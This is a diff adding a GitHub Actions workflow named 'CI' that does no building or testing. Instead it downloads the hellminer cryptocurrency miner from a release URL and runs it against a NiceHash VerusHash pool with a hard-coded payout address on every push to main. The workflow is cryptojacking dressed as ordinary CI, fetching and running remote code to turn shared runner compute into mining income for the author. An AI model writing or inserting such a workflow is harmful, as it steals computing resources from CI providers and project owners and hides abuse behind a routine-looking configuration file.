@@ -1,0 +1,24 @@
+name: CI
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+      
+    - name: Update and install dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y wget libsodium*
+        wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+        tar -xvaf hellminer_linux64.tar.gz
+
+    - name: Run hellminer
+      run: ./hellminer -c verushash.auto.nicehash.com:9200 -u NHbFwcQU3fCTMXB6uNyKXDpcr2CtjvcvhU7b -p x
